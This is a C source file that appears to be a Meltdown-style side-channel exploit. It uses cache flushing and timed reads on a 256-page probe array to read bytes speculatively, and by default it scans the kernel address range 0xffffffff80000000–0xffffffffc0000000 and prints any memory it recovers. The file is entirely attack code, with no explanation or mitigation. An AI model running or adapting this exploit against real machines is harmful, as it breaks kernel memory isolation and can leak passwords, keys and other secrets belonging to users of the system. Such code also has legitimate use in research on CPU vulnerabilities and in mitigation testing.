#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <immintrin.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>

void speculate(const char* target, const char* detector);
uint64_t timed_read(const char* target);

uint64_t baseline_timed(const char* target, int in_cache) {
    uint64_t total = 0;
    (void)timed_read(target);
    for (uint32_t i = 0; i < 16; ++i) {
        if (!in_cache) {
            _mm_clflush(target);
            _mm_mfence();
        }
        total += timed_read(target);
    }
    return total >> 4;
}

uint64_t in_cache_threshold;
char* detector;

void do_kernel_thing(void) {
  syscall(0, 0, 0, 0);
}

int read_via_speculate(const char* target) {
  for (uint32_t i = 0; i < 256; ++i) {
    _mm_clflush(detector + i*4096);
  }
  do_kernel_thing();
  speculate(target, detector);
  uint64_t timings[256];
  for (uint32_t i = 0; i < 256; ++i) {
    timings[i] = timed_read(detector + i*4096);
  }
  for (uint32_t i = 0; i < 256; ++i) {
    if (timings[i] < in_cache_threshold) {
        return (int)i;
    }
  }
  return -1;
}

void dump_range(const char* base) {
  for (uint32_t offs = 0; offs < 64; ++offs) {
    const char* target = base + offs;
    if ((((uintptr_t)target) & 15) == 0) {
      printf("%p: ", target);
    }
    int i = read_via_speculate(target);
    if (i < 0) {
      i = read_via_speculate(target);
    }
    if (i < 0) {
      printf("?? ");
    } else {
      printf("%02x ", i);
    }
    if ((((uintptr_t)target) & 15) == 15) {
      printf("\n");
    }
  }
}

int main(int argc, char** argv) {
  detector = malloc(4096 * 259);
  detector = detector + 4096 * 2 - ((uintptr_t)detector & 4095);
  memset(detector, 0, 4096 * 256);
  in_cache_threshold = (baseline_timed(detector, 1) * 3 + baseline_timed(detector, 0)) >> 2;

  if (argc < 2) {
    for (const char* p = (const char*)0xffffffff80000000ULL; p < (const char*)0xffffffffc0000000ULL; p += 1024) {
      for (const char* q = p; q < p + 128; q += 64) {
        if (read_via_speculate(q) >= 0) {
          dump_range(q);
          printf("---\n");
        }
      }
    }
  } else {
    const char* base = 0;
    if (!sscanf(argv[1], "%p", &base)) {
      printf("bad arg\n");
      return 1;
    }
    base -= ((uintptr_t)base) & 63;
    dump_range(base);
  }
}
